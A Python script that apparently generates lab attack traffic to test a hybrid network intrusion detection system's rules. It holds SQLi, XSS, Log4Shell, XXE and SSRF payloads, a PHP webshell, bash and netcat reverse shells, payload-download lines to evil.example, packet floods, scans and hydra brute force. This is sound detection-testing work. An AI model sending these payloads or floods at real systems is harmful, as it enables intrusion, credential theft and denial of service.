"""
Kịch bản tấn công demo cho Hybrid NIDS – chạy trong container attacker.

Mỗi đòn tấn công gắn với (các) SID mà NIDS phải phát hiện:
- HttpAttack: gửi request HTTP thật qua socket tới victim (nginx), nên có bắt tay TCP đầy đủ.
- PacketAttack: gói tin dựng bằng Scapy (scan, flood, probe UDP/ICMP, payload tới port không có dịch vụ).

Phần dựng payload (build_*) tách khỏi phần gửi (run_*) để test kiểm tra đòn nào cũng trúng rule
mà không cần gửi gói thật. Cách dùng:

    python attacker/attack_demo.py all --target 172.28.0.50 --delay 1.5
    python attacker/attack_demo.py web
    python attacker/attack_demo.py --list
"""
import argparse
import logging
import socket
import struct
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from scapy.all import ICMP, IP, Raw, TCP, UDP, send  # noqa: E402

from config.logger import setup_logging  # noqa: E402

logger = logging.getLogger("nids.attack")

DEFAULT_TARGET = "172.28.0.50"
DNS_HEADER = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"


@dataclass
class HttpAttack:
    name: str
    sids: Tuple[int, ...]
    request: bytes
    port: int = 80
    repeat: int = 1  # Số request gửi liên tiếp (dùng cho flood, brute force)


@dataclass
class PacketAttack:
    name: str
    sids: Tuple[int, ...]
    packets: list
    interval: float = 0.0  # Giãn cách giữa các gói (giây)


@dataclass
class CommandAttack:
    """Đòn chạy bằng công cụ ngoài (hydra...); đích là honeypot nên không có SID kỳ vọng."""
    name: str
    argv: List[str]
    sids: Tuple[int, ...] = ()


Attack = object  # HttpAttack, PacketAttack hoặc CommandAttack


# ─────────────────────────────────────────────────────────────
# HÀM DỰNG PAYLOAD
# ─────────────────────────────────────────────────────────────

def http_request(method: str, uri: str, headers: Optional[Dict[str, str]] = None, body: str = "") -> bytes:
    """Dựng request HTTP/1.1 thô; URI giữ nguyên, không bị mã hoá lại."""
    hdrs = {"Host": "victim.local", "Connection": "close"}
    hdrs.update(headers or {})
    if body:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        hdrs["Content-Length"] = str(len(body.encode("latin-1")))
    head = f"{method} {uri} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items()) + "\r\n"
    return head.encode("latin-1") + body.encode("latin-1")


def dns_query(name: str, qtype: int = 1, qclass: int = 1) -> bytes:
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
    return DNS_HEADER + labels + b"\x00" + struct.pack("!HH", qtype, qclass)


def _ip(target: str, src: Optional[str]) -> IP:
    return IP(dst=target) if src is None else IP(src=src, dst=target)


def _tcp(target, src, dport, flags, payload=b"", sport=40000, seq=1000, ack=1000):
    """Gói TCP tới port bất kỳ; có cờ ACK khi mang payload để thoả flow:established."""
    pkt = _ip(target, src) / TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack)
    return pkt / Raw(load=payload) if payload else pkt


def _udp(target, src, dport, payload):
    return _ip(target, src) / UDP(sport=40001, dport=dport) / Raw(load=payload)


def _icmp(target, src, icmp_type, payload=b""):
    pkt = _ip(target, src) / ICMP(type=icmp_type, code=0)
    return pkt / Raw(load=payload) if payload else pkt


def http_as_packets(attack: HttpAttack, target: str, src: Optional[str] = None) -> list:
    """Chuyển HttpAttack thành gói Scapy (PSH+ACK) để test decode/so khớp mà không gửi thật."""
    return [
        _tcp(target, src, attack.port, "PA", attack.request, sport=40000 + i)
        for i in range(attack.repeat)
    ]


def build_web() -> List[HttpAttack]:
    g = http_request
    return [
        HttpAttack("SQLi UNION SELECT", (1000001, 1000003), g("GET", "/search?q=1'+union+select+username,password+from+users--")),
        HttpAttack("SQLi OR boolean bypass", (1000002,), g("GET", "/login?user=admin'+or+1=1")),
        HttpAttack("SQLi time-based (sleep)", (1000031,), g("GET", "/item?id=1+and+sleep(5)")),
        HttpAttack("SQLi information_schema", (1000032,), g("GET", "/item?id=1+union+select+table_name+from+information_schema.tables")),
        HttpAttack("SQLi DROP TABLE", (1000033,), g("GET", "/item?id=1;drop+table+users")),
        HttpAttack("XSS thẻ <script>", (1000010,), g("GET", "/comment?text=<script>alert(1)</script>")),
        HttpAttack("XSS javascript: URI", (1000011,), g("GET", "/redirect?u=javascript:alert(1)")),
        HttpAttack("XSS event handler (POST body)", (1000012,), g("POST", "/comment", body="text=<img src=x onerror=alert(1)>")),
        HttpAttack("XSS đánh cắp cookie", (1000034,), g("GET", "/q?x=<img+src=x+onerror=fetch('//e/'+document.cookie)>")),
        HttpAttack("XSS iframe", (1000035,), g("GET", "/q?x=<iframe+src=//evil.example>")),
        HttpAttack("Path traversal ../ + /etc/passwd", (1000020, 1000021), g("GET", "/download?file=../../../../etc/passwd")),
        HttpAttack("Path traversal mã hoá %2e%2e%2f", (1000036,), g("GET", "/download?file=%2e%2e%2f%2e%2e%2fetc")),
        HttpAttack("Truy cập win.ini", (1000022,), g("GET", "/download?file=C:/windows/win.ini")),
        HttpAttack("LFI php://filter", (1000037,), g("GET", "/index.php?page=php://filter/convert.base64-encode/resource=config")),
        HttpAttack("RFI URL ngoài", (1000038,), g("GET", "/index.php?page=http://evil.example/shell.txt")),
        HttpAttack("Command injection (| id)", (1000030,), g("GET", "/ping?host=127.0.0.1|id")),
        HttpAttack("Log4Shell JNDI", (1000039,), g("GET", "/", {"X-Api-Version": "${jndi:ldap://evil.example/a}"})),
        HttpAttack("Shellshock", (1000040,), g("GET", "/cgi-bin/status", {"User-Agent": "() { :;}; echo vulnerable"})),
        HttpAttack("XXE", (1000041,), g("POST", "/xml", body='<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hosts">]><f>&x;</f>')),
        HttpAttack("SSRF metadata cloud", (1000042,), g("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/")),
        HttpAttack("Lộ thư mục .git", (1000043,), g("GET", "/.git/config")),
        HttpAttack("Lộ file .env", (1000044,), g("GET", "/.env")),
    ]


def build_scan(target: str, src: Optional[str] = None) -> list:
    t = lambda flags, dport=80: _tcp(target, src, dport, flags)  # noqa: E731
    return [
        PacketAttack("Nmap Xmas scan (FIN+PSH+URG)", (1000100,), [t("FPU")]),
        PacketAttack("Nmap Null scan (không cờ)", (1000101,), [t(0)]),
        PacketAttack("Nmap FIN scan", (1000102,), [t("F")]),
        PacketAttack("SYN-FIN bất thường", (1000103,), [t("SF")]),
        PacketAttack("SYN-RST bất thường", (1000104,), [t("SR")]),
        HttpAttack("Nmap Scripting Engine (User-Agent)", (1000105,),
                   http_request("GET", "/", {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"})),
        HttpAttack("masscan (User-Agent)", (1000106,), http_request("GET", "/", {"User-Agent": "masscan/1.3"})),
        PacketAttack("Quét cổng SYN (25 cổng)", (1000107,), [t("S", dport) for dport in range(1, 26)], interval=0.02),
    ]


def build_dos(target: str, src: Optional[str] = None) -> list:
    return [
        PacketAttack("SYN flood tới cổng 80", (1000201,), [_tcp(target, src, 80, "S", sport=41000 + i) for i in range(30)], interval=0.01),
        HttpAttack("Slowloris (header X-a)", (1000202,), http_request("GET", "/", {"X-a": "b"})),
        PacketAttack("ICMP lớn (Ping of Death)", (1000203,), [_icmp(target, src, 8, b"A" * 1000)]),
        PacketAttack("NTP monlist", (1000204,), [_udp(target, src, 123, b"\x17\x00\x03\x2a" + b"\x00" * 4)]),
        PacketAttack("UDP flood", (1000205,), [_udp(target, src, 9999, b"flood") for _ in range(60)], interval=0.005),
        PacketAttack("ICMP echo flood", (1000206,), [_icmp(target, src, 8, b"ping") for _ in range(30)], interval=0.01),
        PacketAttack("DNS ANY (khuếch đại)", (1000207,), [_udp(target, src, 53, dns_query("example.com", qtype=255))]),
        PacketAttack("Memcached stats (khuếch đại)", (1000208,), [_udp(target, src, 11211, b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")]),
        HttpAttack("HTTP GET flood (40 request)", (1000209,), http_request("GET", "/"), repeat=40),
    ]


def build_auth(target: str, src: Optional[str] = None) -> list:
    return [
        PacketAttack("SSH banner probe", (1000301,), [_tcp(target, src, 22, "PA", b"SSH-2.0-OpenSSH_8.9\r\n")]),
        PacketAttack("SSH brute force (8 kết nối)", (1000305,), [_tcp(target, src, 22, "S", sport=42000 + i) for i in range(8)], interval=0.05),
        PacketAttack("FTP anonymous", (1000302,), [_tcp(target, src, 21, "PA", b"USER anonymous\r\n")]),
        PacketAttack("FTP brute force (8 lần PASS)", (1000307,), [_tcp(target, src, 21, "PA", b"PASS 123456\r\n", sport=43000 + i) for i in range(8)], interval=0.05),
        HttpAttack("HTTP Basic Authorization", (1000303,), http_request("GET", "/admin", {"Authorization": "Basic YWRtaW46YWRtaW4="})),
        HttpAttack("Đăng nhập trang admin", (1000304,), http_request("POST", "/admin/login", body="user=admin&pass=admin")),
        HttpAttack("Brute force đăng nhập web (8 lần)", (1000306,), http_request("POST", "/login", body="user=admin&pass=guess"), repeat=8),
    ]


def build_malware(target: str, src: Optional[str] = None) -> list:
    def c2(payload: bytes, dport: int = 4444) -> list:
        return [_tcp(target, src, dport, "PA", payload)]

    return [
        HttpAttack("PHP webshell (eval base64)", (1000401,), http_request("POST", "/upload.php", body="cmd=eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='))")),
        PacketAttack("Reverse shell bash", (1000402,), c2(b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")),
        PacketAttack("PowerShell DownloadString", (1000403,), c2(b"powershell -c (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')")),
        HttpAttack("sqlmap (User-Agent)", (1000404,), http_request("GET", "/item?id=1", {"User-Agent": "sqlmap/1.7.2"})),
        HttpAttack("Nikto (User-Agent)", (1000405,), http_request("GET", "/", {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"})),
        PacketAttack("Netcat reverse shell", (1000406,), c2(b"nc 10.0.0.1 4444 -e /bin/sh")),
        PacketAttack("Tải payload bằng wget", (1000407,), c2(b"wget http://evil.example/x.sh -O /tmp/x.sh")),
        PacketAttack("Python reverse shell", (1000408,), c2(b"import subprocess;subprocess.call([\"/bin/sh\",\"-i\"])")),
        PacketAttack("Mimikatz", (1000409,), c2(b"mimikatz # sekurlsa::logonpasswords")),
        PacketAttack("File thử nghiệm EICAR", (1000410,), c2(b"X5O...EICAR-STANDARD-ANTIVIRUS-TEST-FILE...")),
        PacketAttack("Cryptominer Stratum", (1000411,), c2(b'{"id":1,"method":"mining.subscribe","params":[]}', 3333)),
    ]


def build_recon(target: str, src: Optional[str] = None) -> list:
    snmp = bytes.fromhex("3026020100") + b"\x04\x06public" + bytes.fromhex("a019020101020100020100300e300c06082b060102010101000500")
    netbios = b"\x80\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01"
    return [
        PacketAttack("SNMP community 'public'", (1000501,), [_udp(target, src, 161, snmp)]),
        PacketAttack("DNS tunneling (c2tunnel)", (1000502,), [_udp(target, src, 53, dns_query("aGVsbG8.c2tunnel.evil.example"))]),
        PacketAttack("ICMP Timestamp scan", (1000503,), [_icmp(target, src, 13)]),
        PacketAttack("ICMP Address Mask scan", (1000504,), [_icmp(target, src, 17)]),
        PacketAttack("NetBIOS nbtstat", (1000505,), [_udp(target, src, 137, netbios)]),
        PacketAttack("DNS zone transfer AXFR", (1000506,), [_tcp(target, src, 53, "PA", b"\x00\x1c" + dns_query("example.com", qtype=252))]),
        PacketAttack("SSDP M-SEARCH", (1000507,), [_udp(target, src, 1900, b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\n\r\n")]),
        PacketAttack("DNS version.bind", (1000508,), [_udp(target, src, 53, dns_query("version.bind", qtype=16, qclass=3))]),
    ]


HONEYPOT_SSH_PORT = 2222
HONEYPOT_HTTP_PORT = 8080


def build_honeypot(target: str, src: Optional[str] = None) -> list:
    """Đòn vào honeypot SSH (2222) và HTTP (8080); kết quả mong đợi là sự kiện HONEYPOT, không phải SID."""
    login = lambda user, pw: http_request("POST", "/wp-admin-login", {"User-Agent": "sqlmap/1.8"}, f"username={user}&password={pw}")  # noqa: E731
    return [
        CommandAttack("SSH brute force (hydra, user root)", ["hydra", "-l", "root", "-p", "123456", "-t", "4", "-s", str(HONEYPOT_SSH_PORT), f"ssh://{target}"]),
        CommandAttack("SSH credential stuffing (hydra, user admin)", ["hydra", "-l", "admin", "-p", "admin", "-t", "4", "-s", str(HONEYPOT_SSH_PORT), f"ssh://{target}"]),
        HttpAttack("Web login sai mật khẩu", (), login("admin", "wrong"), port=HONEYPOT_HTTP_PORT),
        HttpAttack("Web login SQLi", (), login("admin'+or+1=1--", "x"), port=HONEYPOT_HTTP_PORT),
    ]


GROUPS: Dict[str, Callable[..., list]] = {
    "web": lambda target, src=None: build_web(),
    "scan": build_scan,
    "dos": build_dos,
    "auth": build_auth,
    "malware": build_malware,
    "recon": build_recon,
    "honeypot": build_honeypot,
}


def attack_packets(attack, target: str, src: Optional[str] = None) -> list:
    """Toàn bộ gói Scapy của một đòn tấn công (dùng cho test)."""
    if isinstance(attack, CommandAttack):
        return []
    return http_as_packets(attack, target, src) if isinstance(attack, HttpAttack) else attack.packets


# ─────────────────────────────────────────────────────────────
# GỬI TẤN CÔNG
# ─────────────────────────────────────────────────────────────

def send_http(attack: HttpAttack, target: str) -> None:
    for _ in range(attack.repeat):
        try:
            with socket.create_connection((target, attack.port), timeout=3) as s:
                s.sendall(attack.request)
                s.settimeout(1)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
        except OSError as e:
            logger.warning("Không kết nối được %s:%d (%s)", target, attack.port, e)
            return


def send_packets(attack: PacketAttack) -> None:
    send(attack.packets, inter=attack.interval, verbose=False)


def run_command(attack: CommandAttack) -> None:
    try:
        subprocess.run(attack.argv, check=False, timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (OSError, subprocess.TimeoutExpired) as e:
        logger.warning("Không chạy được '%s' (%s)", attack.argv[0], e)


def run_group(group: str, target: str, delay: float) -> int:
    attacks = GROUPS[group](target)
    for attack in attacks:
        sids = ", ".join(str(s) for s in attack.sids) or "sự kiện honeypot"
        logger.info("[%s] %s → kỳ vọng SID %s", group, attack.name, sids)
        if isinstance(attack, HttpAttack):
            send_http(attack, target)
        elif isinstance(attack, CommandAttack):
            run_command(attack)
        else:
            send_packets(attack)
        time.sleep(delay)
    return len(attacks)


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Kịch bản tấn công demo cho Hybrid NIDS")
    parser.add_argument("group", nargs="?", default="all", choices=[*GROUPS, "all"], help="Nhóm tấn công (mặc định: all)")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="IP của victim (mặc định: %(default)s)")
    parser.add_argument("--delay", type=float, default=1.5, help="Giây nghỉ giữa các đòn (mặc định: %(default)s)")
    parser.add_argument("--list", action="store_true", help="Chỉ liệt kê các đòn tấn công, không gửi")
    args = parser.parse_args(argv)

    setup_logging("INFO")
    groups = list(GROUPS) if args.group == "all" else [args.group]

    if args.list:
        for g in groups:
            for attack in GROUPS[g](args.target):
                logger.info("[%s] %s (SID %s)", g, attack.name, ", ".join(map(str, attack.sids)) or "-")
        return 0

    total = sum(run_group(g, args.target, args.delay) for g in groups)
    logger.info("Đã gửi %d đòn tấn công tới %s", total, args.target)
    return 0


if __name__ == "__main__":
    sys.exit(main())
